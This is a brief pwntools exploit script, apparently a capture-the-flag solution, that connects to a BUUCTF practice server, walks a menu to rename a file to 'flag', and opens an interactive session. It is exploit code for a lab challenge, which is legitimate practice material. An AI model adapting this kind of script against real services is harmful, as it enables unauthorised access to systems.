from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25260)
io.sendlineafter(b'==>', b'2')
io.sendlineafter(b'Input the file name you want to cat.\n', b'bin')
io.sendlineafter(b'==>', b'3')
io.sendlineafter(b'Input new name you want to change.\n', b'flag')
io.interactive()